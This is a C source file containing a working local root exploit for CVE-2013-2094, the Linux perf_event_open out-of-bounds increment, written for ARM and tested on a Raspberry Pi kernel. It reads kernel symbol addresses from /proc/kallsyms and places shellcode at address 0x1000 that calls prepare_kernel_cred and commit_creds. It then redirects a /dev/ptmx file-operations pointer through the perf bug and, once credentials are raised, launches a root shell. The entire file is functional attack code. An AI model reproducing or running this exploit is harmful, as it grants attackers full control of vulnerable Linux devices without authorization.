/*
 * ARM exploit for CVE 2013 2094
 * wjlandryiii (https://github.com/wjlandryiii/)
 *
 * based on rikiji's /dev/ptmx fsync() method and shellcode.
 * http://zmbs.net/~rikiji/perf_ptmx.c
 *
 * Uses /proc/kallsyms to resolve kernel symbols.
 *
 * Developed and tested on: Linux raspberrypi 3.6.11+ #371 PREEMPT Thu Feb 7 16:31:35 GMT 2013 armv6l GNU/Linux
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/perf_event.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>


/*  SHELLCODE
Disassembly of section .text:

00008054 <_start>:
    8054:       e92d4000        push    {lr}
    8058:       e3a00000        mov     r0, #0
    805c:       e59f200c        ldr     r2, [pc, #12]   ; 8070 <prepare_kernel_cred_addr>
    8060:       e12fff32        blx     r2
    8064:       e59f2008        ldr     r2, [pc, #8]    ; 8074 <commit_creds_addr>
    8068:       e12fff32        blx     r2
    806c:       e8bd8000        pop     {pc}

00008070 <prepare_kernel_cred_addr>:
    8070:       deadbeef        

00008074 <commit_creds_addr>:
    8074:       cafebebe        

*/

#define SC_PREP_OFFSET (7)
#define SC_COMM_OFFSET (8)

unsigned int shellcode[] = { 
	0xe92d4000,
	0xe3a00000,
	0xe59f200c,
	0xe12fff32,
	0xe59f2008,
	0xe12fff32,
	0xe8bd8000,
	0xdeadbeef,
	0xcafebebe
};

void *resolve_kern_sym(char *symstr){
        FILE *f;
        char line[1024];
        unsigned int addr;
        char type[1024];
        char sym[1024];
	void *ret_addr;

        f = fopen("/proc/kallsyms", "r");

	if(f == NULL){
		printf("Couldn't open /proc/kallsyms!  Aborting...\n");
		exit(-1);
	}

	ret_addr = NULL;
        while(fgets(line, sizeof(line), f) != NULL){
                if(sscanf(line, "%x %s %s", &addr, type, sym) == 3){
                        if(strcmp(symstr, sym) == 0){
                                ret_addr = (void *)addr;
				break;
                        }
                }
        }
        fclose(f);
        return ret_addr;
}

int calc_negative_offset(int *base, int *element){
        unsigned int b = (unsigned int) base;
        unsigned int e = (unsigned int) element;
        int diff;
        int offset;

        diff = e - b;
        offset = diff / 4;

        if(offset >= 0){
                offset -= 0x40000000;
        }

        return offset;
}

static int perf_open(uint64_t off)
{
    struct perf_event_attr attr;
    int rc;

    memset(&attr, 0, sizeof(attr));

    attr.type           = PERF_TYPE_SOFTWARE;
    attr.size           = sizeof(attr);
    attr.config         = off;
    attr.mmap           = 1;
    attr.comm           = 1;
    attr.exclude_kernel = 1;

    rc = syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
    return rc;
}


int inc_address_as_kernel(int *a, int *perf_swevent_enabled){
        int off = calc_negative_offset(perf_swevent_enabled, a);
        return perf_open(off);
}

void *prepare_sc_mmap(void *base, void *prepare_kernel_cred, void *commit_creds){
        void *map = mmap((void *)0x1000, 4*1024, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED, -1, 0);
        if(map == MAP_FAILED){
                printf("Maping failed\n");
		exit(-1);
        }
	shellcode[SC_PREP_OFFSET] = (unsigned int)prepare_kernel_cred;
	shellcode[SC_COMM_OFFSET] = (unsigned int)commit_creds;
	memcpy(map, shellcode, sizeof(shellcode));
	return map;
}


int children[8];

void inc_addr_to_0x1000(int *p, int *perf_swevent_enabled){
        int fds[512];
        int i;
        int j;

        for(i = 0; i < 8; i++){
                children[i] = fork();
                if(children[i] == 0){
                        for(j = 0; j < 512; j++){
                                fds[j] = inc_address_as_kernel(p, perf_swevent_enabled);
                        }
                        printf("child done\n");
                        raise(SIGSTOP);
                        printf("child exiting...\n");
                        for(j = 0; j < 512; j++){
                                close(fds[j]);
                        }
                        exit(0);
                }
        }
}

int wait_for_stopped(){
        int pid;
        printf("waiting for stopped children...\n");
        int count = 0;

        while (pid = waitpid(-1, NULL,  WSTOPPED)) {
                if (errno == ECHILD) {
                        break;
                }
                printf("%d stopped\n", pid);
                count++;
                if(count == 8)
                        break;
        }
        printf("all stopped\n");
        return 0;
}

void cont_and_wait_for_children(){
        int i;

        for(i = 0; i < 8; i++){
                kill(children[i], SIGCONT);
        }

        for(i = 0; i < 8; i++){
                wait();
        }
}


int main(int argc, char *argv[]){
	void *sc_base = (void *)0x1000;
	int *perf_swevent_enabled;
	int *ptmx_fops;
	void *prepare_kernel_cred;
	void *commit_creds;
	int fd;

	//resolve address of kernel symbols	
	perf_swevent_enabled = resolve_kern_sym("perf_swevent_enabled");
	ptmx_fops = resolve_kern_sym("ptmx_fops");
	prepare_kernel_cred = resolve_kern_sym("prepare_kernel_cred");
	commit_creds = resolve_kern_sym("commit_creds");

	printf("0x%08x perf_swevent_enabled\n", perf_swevent_enabled);	
	printf("0x%08x ptmx_fops\n", ptmx_fops);
	printf("0x%08x prepare_kernel_cred\n", prepare_kernel_cred);
	printf("0x%08x commit_creds\n", commit_creds);

	//prepare section containing the shellcode
	prepare_sc_mmap(sc_base, prepare_kernel_cred, commit_creds);

	// bad touch	
	inc_addr_to_0x1000(ptmx_fops + 14, perf_swevent_enabled);
    
	// We need to guarentee that the child processeses are 
	//  done with their dirty work before we can continue;
	wait_for_stopped();

	//Trigger shellcode
	fd = open("/dev/ptmx", O_RDWR);
	if(fd == -1){
		printf("ERROR: Couldn't open /dev/ptmx! Aborting...\n");
		cont_and_wait_for_children();
		exit(-1);
	}
	fsync(fd);
	close(fd);

	cont_and_wait_for_children();

	if(getuid()){
		printf("failed to set credentials\n");
		return -1;
	} 

	printf("Starting shell...\n");
	execl("/bin/sh", "sh", NULL);
	return 0;
}
